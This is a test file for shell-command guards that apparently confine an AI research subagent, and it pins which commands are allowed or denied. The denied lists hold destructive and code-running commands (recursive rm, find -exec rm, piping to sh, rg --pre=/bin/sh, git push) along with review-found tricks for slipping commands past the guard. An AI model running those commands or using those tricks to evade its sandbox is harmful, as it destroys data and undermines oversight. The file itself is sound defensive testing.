// Slice e-guards: the researcher Bash guard, the reviewer egress guard and the compact-context hook, run as child
// processes with fixture state and transcripts (no model call), plus their pure parts imported directly.
import "./test-tmp.mjs";
import { test } from "node:test";
import assert from "node:assert/strict";
import { spawnSync } from "node:child_process";
import { closeSync, existsSync, mkdirSync, mkdtempSync, openSync, readFileSync, readSync, rmSync, symlinkSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join, posix } from "node:path";
import { fileURLToPath } from "node:url";
import { launchRecord, stopRecord } from "../.claude/hooks/brief.mjs";
import { researcherViolation } from "../.claude/hooks/researcher-guard.mjs";
// The w3 third-attempt helpers are read off the namespace, so a guard without them fails those tests only.
import * as guard from "../.claude/hooks/researcher-guard.mjs";
import { agentTranscript, allowedHosts, egressDecision, hostOf } from "../.claude/hooks/egress-guard.mjs";
import { MAX_CONTEXT, runContext } from "../.claude/hooks/compact-context.mjs";

const root = join(dirname(fileURLToPath(import.meta.url)), "..");
const hook = (/** @type {string} */ name) => join(root, ".claude", "hooks", name);
const RESEARCHER = hook("researcher-guard.mjs");
const EGRESS = hook("egress-guard.mjs");
const COMPACT = hook("compact-context.mjs");

const scratch = mkdtempSync(join(tmpdir(), "guards-test-"));
process.on("exit", () => rmSync(scratch, { recursive: true, force: true }));
const project = join(scratch, "project");
const stateDir = join(project, ".claude", "state");
mkdirSync(stateDir, { recursive: true });

const baseEnv = Object.fromEntries(Object.entries(process.env).filter(([k]) => !k.startsWith("ORCH_") && k !== "CLAUDE_PLUGIN_DATA"));
const env = (/** @type {Record<string, string>} */ extra = {}) => ({ ...baseEnv, CLAUDE_PROJECT_DIR: project, CLAUDE_PLUGIN_DATA: join(scratch, "plugin-data"), ...extra });

/** @param {string} script @param {unknown} input @param {Record<string, string>} [extra] */
function run(script, input, extra = {}) {
  const r = spawnSync(process.execPath, [script], { input: typeof input === "string" ? input : JSON.stringify(input), env: env(extra), cwd: project, encoding: "utf8" });
  return { code: r.status, stdout: r.stdout, stderr: r.stderr };
}

/** No allow or ask decision anywhere in a hook's output (C6). @param {{ stdout: string }} r */
function noDecision(r) {
  assert.doesNotMatch(r.stdout, /permissionDecision|"decision"\s*:\s*"(allow|approve|ask)"/);
}

// ---- researcher guard ----

const ALLOWED = [
  "git log --oneline -5",
  "git log --format=\"%h <%ae>\" -3",
  "git -C /some/repo status --short",
  "git -C ../other show HEAD:README.md",
  "git branch --show-current",
  "git ls-files | wc -l",
  "git rev-parse HEAD && git rev-list --count HEAD",
  "ls -la src; du -sh .",
  "wc -l src/*.ts",
  // 1.2.0: read-only search and paging (the Grep and Glob tools are absent for an agent that also lists Bash).
  "grep -rn \"foo bar\" src --include='*.ts'",
  "grep -rnE 'a|b' . --exclude-dir=node_modules -A 3 | head -20",
  "git ls-files | grep -c test",
  "grep -rl SubagentHandback .claude/hooks/",
  "tail --lines=5 a.txt",
  "head --bytes=100 a.txt | wc -c",
  "cat a.txt /dev/null",
  "grep --file=/dev/null x .",
  "rg -f/dev/null x .",
  "grep -rn foo . --include=*.ts --exclude-dir=node_*", // a glob in an option's value, not its name
  "ls src/*.ts README*",
  "rg -n --glob '*.mjs' tokenize .claude/hooks",
  "find . -name '*.md' -type f",
  "find src -maxdepth 2 -newer package.json | wc -l",
  "head -50 README.md",
  "tail -n 20 CHANGELOG.md",
  "cat package.json",
];
const DENIED = [
  ["cat > notes.md <<'EOF'\nhello\nEOF", /heredoc|redirection/],
  ["python3 -c 'print(1)'", /python3/],
  ["cd /tmp && ls", /`cd`/],
  ["git log | python3", /python3/],
  ["git ls-files | xargs cat", /xargs/],
  ["ls > out.txt", /redirection/],
  ["git log >> log.txt", /redirection/],
  ["wc -l < f", /redirection/],
  ["ls $(pwd)", /substitution/],
  ["ls `pwd`", /substitution/],
  ["wc -l <(git ls-files)", /substitution/],
  ["X=1 ls", /assignment/],
  ["ls $HOME", /expansion/],
  ["git log --output=out.txt", /--output/],
  ["git branch -D main", /`git`/],
  ["git -c core.pager=sh log", /`git`/],
  ["git push origin main", /`git`/],
  ["f() { ls; }; f", /function|`f`/],
  ["ls 'unterminated", /cannot be read/],
  ["git log\nrm -r src", /`rm`/],
  // Review GAP 30: an escaped quote hid this heredoc from the quote-stripping regex.
  ["ls \\'<<X\n${x:=y}'\nX", /heredoc/],
  ["ls <<<'text'", /here-string|heredoc/],
  ["git log | wc -l <<X\nx\nX", /heredoc/],
  ["ls \\'<f \\'", /redirection/],
  // 1.2.0: the search and paging commands, in the forms that write a file, run a program or never end.
  ["find . -name '*.tmp' -delete", /find -delete/],
  ["find . -type f -exec rm {} +", /find -exec/],
  ["find . -fprint out.txt", /find -fprint/],
  ["grep --filter='gz:zcat' foo .", /grep --filter/],
  ["grep --pager=less foo .", /grep --pager/],
  ["grep ---myconf foo .", /not an allowed option/],
  ["rg --pre cat foo", /rg --pre/],
  ["tail -f log.txt", /never ends/],
  ["tail --follow=name log.txt", /tail --follow is not an allowed option/],
  // Review of 2026-11-10: a lone `--` can be the value of an option, so it never ends the check.
  ["rg -e -- --pre=/bin/sh foo .", /rg --pre/],
  ["rg --regexp -- --pre=sh x .", /rg --pre/],
  ["grep -e -- --filter=sh foo .", /grep --filter/],
  ["grep -c -- --filter notes.md", /grep --filter/], // harmless, refused all the same: the price of that rule
  // ripgrep's -z starts decompression programs; ugrep's -Q opens an interactive screen.
  ["rg -z foo .", /-z starts decompression/],
  ["rg -nz foo .", /-z starts decompression/],
  ["rg --search-zip foo .", /rg --search-zip/],
  ["grep -Q foo", /-Q opens an interactive screen/],
  // tail's historic syntax and GNU's shortened long options also follow.
  ["tail -5f a.txt", /never ends/],
  ["tail -F a.txt", /never ends/],
  ["tail --fol a.txt", /tail --fol is not an allowed option/],
  ["tail --retry a.txt", /tail --retry/],
  // bfs's own name for -delete, and devices that never end.
  ["find . -name '*.tmp' -rm", /find -rm/],
  ["cat /dev/zero", /device that may never end/],
  ["head /dev/urandom", /device that may never end/],
  ["grep x /dev/zero", /device that may never end/],
  ["tail /dev/zero", /device that may never end/],
  // A device attached to an option is read all the same.
  ["grep --file=/dev/zero x", /device that may never end/],
  ["rg -f/dev/urandom x", /device that may never end/],
  ["grep -rf/dev/urandom x .", /device that may never end/],
  ["tail --lines=5 --verbose=/dev/zero", /device that may never end/],
  // A glob in an option's name expands to whatever option a file of that name spells (`-?` to `-f`, `-delet[e]` to -delete).
  ["tail -? log.txt", /glob in an option/],
  ["find . -delet[e]", /glob in an option/],
  ["find . -de*", /glob in an option/],
  ["rg --glob* x .", /glob in an option/],
  ["git log -?", /glob in an option/],
  // The denial says how to write it instead: quote the glob or use the long form.
  ["rg -g*.md x", /quote the glob \(`rg -g '\*\.md' x`\) or use the long form \(`--glob=\*\.md`\)/],
  ["grep -e -* f", /quote the glob/],
  ["grep foo . > out.txt", /redirection/],
  ["cat a.txt | sh", /`sh`/],
  ["/usr/bin/grep foo .", /not an allowed command/],
  ["sed -i 1,5p a.txt", /`sed`/], // T-11: `sed -n 1,5p a.txt` passes now; -i does not
];

test("researcher guard: allowlisted commands pass", () => {
  for (const c of ALLOWED) assert.equal(researcherViolation(c), null, c);
});

test("researcher guard: everything else is denied with a reason", () => {
  for (const [c, re] of DENIED) {
    const v = researcherViolation(/** @type {string} */ (c));
    assert.ok(v, `expected a denial for ${JSON.stringify(c)}`);
    assert.match(v.reason, /** @type {RegExp} */ (re), String(c));
  }
});

// The decision the guard gave each command at commit 525e464, before its denial messages gained hints. Literal values,
// so a change to the messages (or to the lists above) cannot move what is allowed or denied without failing here.
// Every command the tests in this file use, plus forms researchers were refused in real use.
const DECISIONS = /** @type {[string, "allow" | "deny"][]} */ ([
  ["git log --oneline -5", "allow"],
  ["git log --format=\"%h <%ae>\" -3", "allow"],
  ["git -C /some/repo status --short", "allow"],
  ["git -C ../other show HEAD:README.md", "allow"],
  ["git branch --show-current", "allow"],
  ["git ls-files | wc -l", "allow"],
  ["git rev-parse HEAD && git rev-list --count HEAD", "allow"],
  ["ls -la src; du -sh .", "allow"],
  ["wc -l src/*.ts", "allow"],
  ["grep -rn \"foo bar\" src --include='*.ts'", "allow"],
  ["grep -rnE 'a|b' . --exclude-dir=node_modules -A 3 | head -20", "allow"],
  ["git ls-files | grep -c test", "allow"],
  ["grep -rl SubagentHandback .claude/hooks/", "allow"],
  ["tail --lines=5 a.txt", "allow"],
  ["head --bytes=100 a.txt | wc -c", "allow"],
  ["cat a.txt /dev/null", "allow"],
  ["grep --file=/dev/null x .", "allow"],
  ["rg -f/dev/null x .", "allow"],
  ["grep -rn foo . --include=*.ts --exclude-dir=node_*", "allow"],
  ["ls src/*.ts README*", "allow"],
  ["rg -n --glob '*.mjs' tokenize .claude/hooks", "allow"],
  ["find . -name '*.md' -type f", "allow"],
  ["find src -maxdepth 2 -newer package.json | wc -l", "allow"],
  ["head -50 README.md", "allow"],
  ["tail -n 20 CHANGELOG.md", "allow"],
  ["cat package.json", "allow"],
  ["cat > notes.md <<'EOF'\nhello\nEOF", "deny"],
  ["python3 -c 'print(1)'", "deny"],
  ["cd /tmp && ls", "deny"],
  ["git log | python3", "deny"],
  ["git ls-files | xargs cat", "deny"],
  ["ls > out.txt", "deny"],
  ["git log >> log.txt", "deny"],
  ["wc -l < f", "deny"],
  ["ls $(pwd)", "deny"],
  ["ls `pwd`", "deny"],
  ["wc -l <(git ls-files)", "deny"],
  ["X=1 ls", "deny"],
  ["ls $HOME", "deny"],
  ["git log --output=out.txt", "deny"],
  ["git branch -D main", "deny"],
  ["git -c core.pager=sh log", "deny"],
  ["git push origin main", "deny"],
  ["f() { ls; }; f", "deny"],
  ["ls 'unterminated", "deny"],
  ["git log\nrm -r src", "deny"],
  ["ls \\'<<X\n${x:=y}'\nX", "deny"],
  ["ls <<<'text'", "deny"],
  ["git log | wc -l <<X\nx\nX", "deny"],
  ["ls \\'<f \\'", "deny"],
  ["find . -name '*.tmp' -delete", "deny"],
  ["find . -type f -exec rm {} +", "deny"],
  ["find . -fprint out.txt", "deny"],
  ["grep --filter='gz:zcat' foo .", "deny"],
  ["grep --pager=less foo .", "deny"],
  ["grep ---myconf foo .", "deny"],
  ["rg --pre cat foo", "deny"],
  ["tail -f log.txt", "deny"],
  ["tail --follow=name log.txt", "deny"],
  ["rg -e -- --pre=/bin/sh foo .", "deny"],
  ["rg --regexp -- --pre=sh x .", "deny"],
  ["grep -e -- --filter=sh foo .", "deny"],
  ["grep -c -- --filter notes.md", "deny"],
  ["rg -z foo .", "deny"],
  ["rg -nz foo .", "deny"],
  ["rg --search-zip foo .", "deny"],
  ["grep -Q foo", "deny"],
  ["tail -5f a.txt", "deny"],
  ["tail -F a.txt", "deny"],
  ["tail --fol a.txt", "deny"],
  ["tail --retry a.txt", "deny"],
  ["find . -name '*.tmp' -rm", "deny"],
  ["cat /dev/zero", "deny"],
  ["head /dev/urandom", "deny"],
  ["grep x /dev/zero", "deny"],
  ["tail /dev/zero", "deny"],
  ["grep --file=/dev/zero x", "deny"],
  ["rg -f/dev/urandom x", "deny"],
  ["grep -rf/dev/urandom x .", "deny"],
  ["tail --lines=5 --verbose=/dev/zero", "deny"],
  ["tail -? log.txt", "deny"],
  ["find . -delet[e]", "deny"],
  ["find . -de*", "deny"],
  ["rg --glob* x .", "deny"],
  ["git log -?", "deny"],
  ["rg -g*.md x", "deny"],
  ["grep -e -* f", "deny"],
  ["grep foo . > out.txt", "deny"],
  ["cat a.txt | sh", "deny"],
  ["/usr/bin/grep foo .", "deny"],
  ["sed -n 1,5p a.txt", "allow"], // T-11 (owner-approved change): was deny
  ["sed -i 1,5p a.txt", "deny"],
  ["cat > x.py <<EOF\nprint(1)\nEOF", "deny"],
  ["python3 x.py", "deny"],
  ["cd src && ls", "deny"],
  ["git log --oneline | wc -l", "allow"],
  ["cd /x && grep -n foo a.txt", "deny"],
  ["grep foo a.txt | sort", "deny"],
  ["echo hi", "allow"], // T-11: was deny
  ["echo hi > a.txt", "deny"],
  ["x=0; grep foo a.txt", "deny"],
  // b4: exactly `2>/dev/null` and `2>&1`, each a word of its own, are the only redirections allowed.
  ["grep foo a.txt 2>/dev/null", "allow"],
  ["ls -la /x 2>/dev/null", "allow"],
  ["grep -rn foo src 2>&1 | head -5", "allow"],
  ["ls /x 2>/dev/null && wc -l a.txt 2>/dev/null", "allow"],
  ["ls /x >/dev/null", "deny"],
  ["ls /x 1>/dev/null", "deny"],
  ["ls /x &>/dev/null", "deny"],
  ["ls /x 2>/dev/nullx", "deny"],
  ["ls /x 2>/dev/null.txt", "deny"],
  ["ls /x 2> /dev/null", "deny"],
  ["ls /x 2>file", "deny"],
  ["ls /x 2>>file", "deny"],
  ["ls /x >&2", "deny"],
  ["wc -l <file", "deny"],
  ["cat <<EOF\nx\nEOF", "deny"],
  ["cat <<<x", "deny"],
  ["ls /x 2>&1 >out", "deny"],
  ["ls /x 2>/dev/null>out", "deny"],
  ["ls /x 2>/dev/null;2>/dev/null ls", "deny"],
  ["2>/dev/null ls /x", "deny"],
  ["ls a\\ 2>/dev/null", "deny"],
  ["ls /x # 2>/dev/null", "deny"],
  ["ls $'\\' 2>/dev/null '", "deny"],
  ["ls '/x' 2>/dev/null \"a\" 2>&1", "allow"],
  ["ls $(ls 2>/dev/null)", "deny"],
  ["ls `ls 2>&1`", "deny"],
  ["ls /x 2>/dev/null; python3 x.py", "deny"],
  ["ls /x 2>&1 | sh", "deny"],
  ["wc -l /x/a.txt /x/b.txt", "allow"],
  ["wc -l /x/{a,b}.txt", "deny"],
]);

test("researcher guard: every recorded command keeps its allow or deny decision", () => {
  for (const [c, want] of DECISIONS) {
    /** @type {string | undefined} */
    let got;
    assert.doesNotThrow(() => {
      got = researcherViolation(c) ? "deny" : "allow";
    }, c);
    assert.equal(got, want, c);
  }
});

// A denial says what to use instead, and keeps its first words so the gate records still group.
const HINTS = [
  // fix-researcher-cd (owner-approved change): a refused `cd` names the one form that is allowed (no project folder
  // given here, so every cd is refused), and still says to put absolute paths in the command.
  ["cd /x && grep -n foo a.txt", /^`cd` is allowed only as `cd <path>` .*project folder.*absolute paths/],
  ["cd src && ls", /^`cd` is allowed only as `cd <path>` .*project folder.*absolute paths/],
  // T-11: `sed` passes in its narrow form; the refusal of any other form names the allowed one.
  ["sed -i 1,5p a.txt", /^`sed` is allowed only as `sed -n '10p' <file>` or `sed -n '10,40p' <file>`/],
  ["cut -z a.txt", /^cut -z is not an allowed option; use only -b, -c, -f, -d, -s, --complement and --output-delimiter/],
  ["stat --bogus a.txt", /^stat --bogus is not an allowed option/],
  ["awk 'NR<5' a.txt", /^`awk` is not an allowed command; .*Read tool with offset and limit.*`head` and `tail`/],
  ["grep foo a.txt | sort", /^`sort` is not an allowed command; .*grep, rg, find, head, tail, cat, ls, wc, du.*in the report/],
  ["uniq a.txt", /^`uniq` is not an allowed command; .*grep, rg, find.*in the report/],
  ["tr a b", /^`tr` is not an allowed command; .*grep, rg, find.*in the report/], // T-11: `echo hi` passes now
  ["printf hi", /^`printf` is not an allowed command; .*grep, rg, find.*in the report/],
  ["python3 x.py", /^`python3` is not an allowed command; .*grep, rg, find.*in the report/],
  ["x=0; grep foo a.txt", /^a variable assignment; .*grep, rg, find.*in the report/],
];

test("researcher guard: a refused command's reason says what to use instead, in one or two short sentences", () => {
  for (const [c, re] of HINTS) {
    const v = researcherViolation(/** @type {string} */ (c));
    assert.ok(v, String(c));
    assert.match(v.reason, /** @type {RegExp} */ (re), String(c));
    assert.ok(v.reason.split(/\. /).length <= 2 && v.reason.length <= 240, `short: ${v.reason}`);
  }
});

// Audit 2026-11-16 T-5: the device rule judges the normalised path (also a relative one, against the command's
// folder), and wc is under it too. /dev/null stays allowed where it was.
test("researcher guard (T-5): a device reached by another spelling of its path, or through wc, is refused", () => {
  for (const c of [
    "cat /./dev/zero",
    "cat //dev/zero",
    "cat /private/../dev/zero",
    "tail -c +1 /./dev/urandom",
    "head -c 8 /dev/./zero",
    "grep --file=//dev/zero x",
    "rg -f/./dev/urandom x",
    "grep -rf//dev/urandom x .",
    "wc /dev/zero",
    "wc -c /dev/stdin",
    "wc -l //dev/zero",
    "cat ../../../../../../../../../../dev/zero",
  ]) {
    const v = researcherViolation(c, "/a/b");
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  for (const c of ["cat a.txt /dev/null", "cat a.txt //dev/null", "wc -l a.txt /dev/null", "grep --file=/dev/null x .", "rg -f/dev/null x .", "wc -l /x/a.txt /x/b.txt", "cat ../notes/devices.md", "grep -rn dev ../dev-notes"]) {
    assert.equal(researcherViolation(c, "/a/b"), null, c);
  }
});

// Third review of fix-guards: a symlink to `/` followed by `..` reaches /dev by a path whose text-normalised form does
// not exist, so the device rule also asks the system for the real path of the unnormalised string.
test("researcher guard (T-5): a device reached through a symlink and `..` is refused", () => {
  const links = join(scratch, "device-links");
  mkdirSync(links, { recursive: true });
  const link = join(links, "root-link");
  if (!existsSync(link)) symlinkSync("/", link);
  for (const c of [
    `cat ${link}/../dev/zero`,
    `wc ${link}/../dev/zero`,
    `grep -f${link}/../dev/zero x`,
    `grep --file=${link}/../dev/zero x`,
    `head -c 8 '${link}/../dev/urandom'`,
    `cut -f1 ${link}/../dev/zero`,
  ]) {
    const v = researcherViolation(c, "/a/b");
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  // Relative to the folder the command runs in.
  for (const c of ["cat root-link/../dev/zero", "wc -c root-link/../dev/zero", "grep -froot-link/../dev/zero x"]) {
    const v = researcherViolation(c, links);
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  // A cd into a symlink to `/` is refused (fix-researcher-cd: with or without a project folder, it leads out of it), so
  // a relative path after it never reaches a device the check cannot follow.
  const v = researcherViolation(`cd ${link} && cat ../dev/zero`, "/a/b");
  assert.ok(v);
  assert.match(v.reason, /^`cd` is allowed only as `cd <path>` .*absolute paths/);
  const vp = researcherViolation(`cd ${link} && cat ../dev/zero`, links, links);
  assert.ok(vp);
  assert.match(vp.reason, /^`cd` is allowed only as `cd <path>` .*absolute paths/);
  // /dev/null through the link, and ordinary files, still pass.
  for (const c of [`cat ${link}/../dev/null`, `cat ${link}/../etc/hosts`, "cat root-link/../a.txt"]) {
    assert.equal(researcherViolation(c, links), null, c);
  }
});

// Review of fix-guards: a value joined to a short-option cluster (`-rfdev/zero`) can start after any letter, so every
// suffix of an option word, like a long option's value, is judged as a path from the folder the command runs in.
test("researcher guard (T-5): a relative device path joined to an option is refused", () => {
  for (const c of [
    "grep -fdev/zero x",
    "grep -rfdev/zero x",
    "grep -A3fdev/zero x",
    "rg -fdev/zero x",
    "rg -nfdev/urandom x",
    "grep --file=dev/zero x",
    "rg --file=dev/urandom x",
    "grep -f dev/zero x",
    "head -n5 dev/zero",
    "head -c8dev/zero",
    "tail -n5 dev/zero",
    "wc -l dev/zero",
    "wc -ldev/zero",
    "sed -n 1p dev/zero",
    "cut -f1 dev/zero",
    "cut -sfdev/zero",
  ]) {
    const v = researcherViolation(c, "/");
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  for (const c of ["grep -fzero x", "grep -rfzero x"]) {
    const v = researcherViolation(c, "/dev");
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  // Ordinary option words that are no paths still pass, also from `/`.
  for (const c of ["grep -n foo a.txt", "grep -rn foo src", "grep -A3 foo a.txt", "grep -e -pattern a.txt"]) {
    assert.equal(researcherViolation(c, "/a/b"), null, c);
  }
  for (const c of ["head -n5 a.txt", "cut -d, -f1 a.csv", "rg -f/dev/null x", "wc -c dev.txt"]) {
    assert.equal(researcherViolation(c, "/"), null, c);
  }
  // fix-researcher-cd round 2 (item C, coordinator-approved change): from `/` the bare word `dev` names /dev, so these
  // two, allowed before, are refused now; `wc -c dev.txt` beside them still passes.
  for (const c of ["grep -rn dev x", "grep -rdev x"]) assert.ok(researcherViolation(c, "/"), c);
});

// Audit 2026-11-16 T-11 (approved by the owner): narrow forms of sed -n, cut, stat and echo, which cannot write a file
// or start a program, pass; their neighbours that could stay refused, each with a message naming the allowed form.
// `cd` is refused in the pinned decisions above (no project folder given); its one allowed form is under "cd item 2".
test("researcher guard (T-11): sed -n, cut, stat and echo in their narrow forms pass", () => {
  for (const c of [
    "sed -n '10p' a.md",
    "sed -n '10,40p' a.md b.md",
    "sed -n 1,5p a.txt",
    "git show HEAD:a.md | sed -n '3,9p'",
    "cut -d, -f1 a.csv",
    "cut -d ',' -f 1,3 a.csv",
    "cut -c1-10 a.txt",
    "cut -b 1-4 a.txt",
    "cut -sf2 -d: a.txt",
    "cut --complement -f2 a.csv",
    "cut --output-delimiter=';' -f1,2 -d, a.csv",
    "cut --output-delimiter ' ' -f1 -d, a.csv",
    "stat a.txt",
    "stat -f %z a.txt",
    "stat -c %s a.txt",
    "stat --printf='%s\\n' a.txt",
    "stat -L --format=%y a.txt",
    "echo ---",
    "echo hi && cat a.txt",
    "echo -n done",
  ]) {
    assert.equal(researcherViolation(c, "/a/b"), null, c);
  }
});

test("researcher guard (T-11): the neighbours of the new forms that could write, run or read for ever stay refused", () => {
  for (const [c, re] of /** @type {[string, RegExp][]} */ ([
    // sed: only -n with one line or one range and p.
    ["sed -i 's/a/b/' a.txt", /`sed` is allowed only as `sed -n '10p' <file>`/],
    ["sed -i 1,5p a.txt", /`sed` is allowed only as/],
    ["sed -n '1w out' a.txt", /`sed` is allowed only as/],
    ["sed -n '1e cmd' a.txt", /`sed` is allowed only as/],
    ["sed -n 's/a/b/w out' a.txt", /`sed` is allowed only as/],
    ["sed -n 's/a/b/e' a.txt", /`sed` is allowed only as/],
    ["sed -n '1p;2p' a.txt", /`sed` is allowed only as/],
    ["sed -n '$p' a.txt", /`sed` is allowed only as|expansion/],
    ["sed -e 1p a.txt", /`sed` is allowed only as/],
    ["sed -n -e 1p a.txt", /`sed` is allowed only as/],
    ["sed -n 1p -i a.txt", /`sed` is allowed only as/],
    ["sed -n 1p --in-place a.txt", /`sed` is allowed only as/],
    ["sed -n 1p -- -i", /`sed` is allowed only as/],
    ["sed -n 1p *", /`sed` is allowed only as/], // a file named -i would turn into an option
    ["sed -n -s 1p a.txt", /`sed` is allowed only as/],
    ["sed 1p a.txt", /`sed` is allowed only as/],
    ["sed -n 1,5p /dev/zero", /device/],
    ["sed -n 1p //dev/urandom", /device/],
    // cut: only -b, -c, -f, -d, -s, --complement and --output-delimiter.
    ["cut -z -f1 a.txt", /cut -z is not an allowed option; use only -b, -c, -f, -d, -s, --complement and --output-delimiter/],
    ["cut -n -b1 a.txt", /cut -n is not an allowed option/],
    ["cut --delimiter=, -f1 a.txt", /cut --delimiter is not an allowed option/],
    ["cut --fields=1 a.txt", /cut --fields is not an allowed option/],
    ["cut --zero-terminated -f1 a.txt", /not an allowed option/],
    ["cut -d, -- --foo", /not an allowed option/],
    ["cut -f1 /dev/zero", /device/],
    ["cut -f1 /./dev/urandom", /device/],
    // stat: long options from an allowlist only.
    ["stat --bogus a.txt", /stat --bogus is not an allowed option/],
    // echo: output only, never into a file.
    ["echo hi > out.txt", /redirection/],
    ["echo hi >> out.txt", /redirection/],
    ["echo $(id)", /substitution/],
    ["echo $HOME", /expansion/],
    ["printf hi", /`printf`/],
  ])) {
    const v = researcherViolation(c, "/a/b");
    assert.ok(v, `expected a denial for ${JSON.stringify(c)}`);
    assert.match(v.reason, re, c);
    assert.ok(v.reason.split(/\. /).length <= 2 && v.reason.length <= 240, `short: ${v.reason}`);
  }
});

const bash = (/** @type {string} */ command, /** @type {string | null} */ agentType = "researcher") => ({
  session_id: "s-r", agent_id: "a-r", ...(agentType && { agent_type: agentType }), hook_event_name: "PreToolUse", tool_name: "Bash", tool_input: { command },
});

// fix-researcher-cd item 1: a path that is /dev itself, in any spelling the text normalisation or the system's
// resolution turns into /dev, is refused like a path under it (a recursive search of /dev reads devices).
test("researcher guard (cd item 1): /dev itself is refused in every spelling, /dev/null still passes", () => {
  const links = join(scratch, "dev-itself");
  mkdirSync(links, { recursive: true });
  const toDev = join(links, "to-dev");
  const toRoot = join(links, "to-root");
  if (!existsSync(toDev)) symlinkSync("/dev", toDev);
  if (!existsSync(toRoot)) symlinkSync("/", toRoot);
  for (const c of [
    "grep -r x /dev/", "grep -r x /dev/.", "grep -r x /dev/zero/..", "cat /dev/", "grep -r x /dev",
    "rg x /dev", "grep -r x //dev", "grep -r x /./dev/", "wc /dev", "head /dev/", "tail /dev/null/..", "grep -r x /dev/fd/..",
    "grep -r x ../../dev", "grep -rf/dev/ x", "grep --file=/dev x", "sed -n 1p /dev/", "cut -f1 /dev",
    `grep -r x ${toDev}`, `grep -r x ${toDev}/`, `grep -r x ${toRoot}/dev`, `grep -r x ${toRoot}/../dev`, `rg -f${toDev} x`,
  ]) {
    const v = researcherViolation(c, "/a/b");
    assert.ok(v, `expected a denial for ${c}`);
    assert.match(v.reason, /device that may never end/, c);
  }
  for (const c of ["cat a.txt /dev/null", "cat /dev/null", "grep --file=/dev/null x .", "rg -f/dev/null x .", "grep -r x ../devices", "grep -r x /a/dev", "cat ../notes/dev"]) {
    assert.equal(researcherViolation(c, "/a/b"), null, c);
  }
  // From `/`, a path that names /dev is refused, the bare word `dev` too (round 2, item C).
  for (const c of ["grep -r x ./dev", "grep -r x dev/", "grep -r x /dev", "rg x ./dev/.", "grep -r x dev", "grep -rn dev x", "rg x dev"]) {
    assert.match(researcherViolation(c, "/")?.reason ?? "", /device/, c);
  }
  // From /dev or below it, `.` and a search with no path (which searches `.`) read /dev.
  for (const cwd of ["/dev", "/dev/", "/dev/fd", toDev]) {
    for (const c of ["grep -r x .", "grep -rn foo .", "rg x .", "rg x", "grep -r x", "cat zero", "wc -l null/..", "ls && grep -r x ."]) {
      assert.match(researcherViolation(c, cwd)?.reason ?? "", /device/, `${c} in ${cwd}`);
    }
  }
  for (const c of ["ls", "ls -la", "cat /dev/null", "head /a/b.txt"]) assert.equal(researcherViolation(c, "/dev"), null, c);
  // On the safe side: in /dev every search is refused, also one with a path elsewhere (a pattern looks like a path).
  assert.ok(researcherViolation("grep -rn foo /a/b", "/dev"));
  for (const c of ["grep -rn foo .", "rg x", "ls", "cat a.txt"]) assert.equal(researcherViolation(c, "/a/b"), null, c);
});

// fix-researcher-cd round 2 (item A): the system's real-path call (`realpathSync.native`) on a path that reaches /dev
// itself through a symlink ends the process with SIGTRAP or SIGSEGV, or reports a false ENOENT, after a few dozen calls
// (Node 24.22.2, Darwin 27.2). The guard no longer makes that call. These run in fresh processes, never in this one.
// The fault shows for a long path to the link (about 150 characters and more), not for a short one.
const devProbe = join(scratch, "dev-probe", "a".repeat(100));
mkdirSync(join(devProbe, "proj", "sub"), { recursive: true });
const ldev = join(devProbe, "proj", "ldev");
const lnull = join(devProbe, "proj", "lnull");
if (!existsSync(ldev)) symlinkSync("/dev", ldev);
if (!existsSync(lnull)) symlinkSync("/dev/null", lnull);

test("researcher guard (round 2, item A): 300 decisions on a link to /dev end normally and all refuse, in fresh processes", () => {
  const script = join(devProbe, "decide.mjs");
  const guardUrl = new URL("../.claude/hooks/researcher-guard.mjs", import.meta.url).href;
  const p = join(devProbe, "proj");
  writeFileSync(script, `const { researcherViolation } = await import(${JSON.stringify(guardUrl)});
const forms = [${JSON.stringify(`grep -r x ${ldev}`)}, ${JSON.stringify(`grep -r x ${ldev}/`)}, ${JSON.stringify(`cat ${ldev}/.`)}, "cd ./sub && grep -r x ../ldev", "cd ./sub && cat ../ldev/"];
let refused = 0;
for (let i = 0; i < 300; i++) if (researcherViolation(forms[i % forms.length], ${JSON.stringify(p)}, ${JSON.stringify(p)})) refused++;
console.log(refused);
`);
  for (let run = 0; run < 6; run++) {
    const r = spawnSync(process.execPath, [script], { encoding: "utf8", cwd: devProbe });
    assert.deepEqual([r.status, r.signal, r.stdout.trim()], [0, null, "300"], `run ${run}: ${r.stderr.slice(0, 300)}`);
  }
});

test("researcher guard hook (round 2, item A): a command with 300 links to /dev and then <link>/zero is refused with exit 2", () => {
  const command = `cat ${Array(300).fill(ldev).join(" ")} ${ldev}/zero`;
  for (let i = 0; i < 3; i++) {
    const r = run(RESEARCHER, bash(command));
    assert.deepEqual([r.code, r.stdout], [2, ""], r.stderr.slice(0, 200));
  }
  // /dev/null passes in every spelling it passed before, also through a link to it or to /dev.
  for (const c of ["cat /dev/null", "cat //dev/null", "cat a.txt /dev/null", "grep --file=/dev/null x .", "rg -f/dev/null x .", `cat ${lnull}`, `cat ${ldev}/null`, `grep --file=${ldev}/null x .`]) {
    // (a short-option form such as `grep -f<path>` would also be refused when the random temp name holds a Q: -Q)
    assert.equal(run(RESEARCHER, bash(c)).code, 0, c);
  }
});

// fix-researcher-cd item 2: `cd` with one literal path whose real location is the project folder or a folder inside it.
const cdRoot = join(scratch, "cd");
const proj = join(cdRoot, "proj");
const sub = join(proj, "sub");
const deep = join(sub, "deep");
const home = join(cdRoot, "home");
const outside = join(cdRoot, "outside");
for (const d of [deep, home, outside]) mkdirSync(d, { recursive: true });
writeFileSync(join(proj, "file.txt"), "x\n");
for (const [at, to] of /** @type {[string, string][]} */ ([
  [join(proj, "link-out"), "/"], [join(proj, "link-home"), home], [join(proj, "link-in"), sub], [join(proj, "link-dev"), "/dev"],
  [join(proj, "link-out-rel"), "../outside"], [join(sub, "r"), "/"], [join(sub, "dev"), "/dev"], [join(sub, "upper"), ".."],
])) {
  if (!existsSync(at)) symlinkSync(to, at);
}
const CD_FORM = /^`cd` is allowed only as `cd <path>` .*`\.\/`, `\.\.\/` or `\/`.*`cd \.\/src`.*project folder.*absolute paths/;

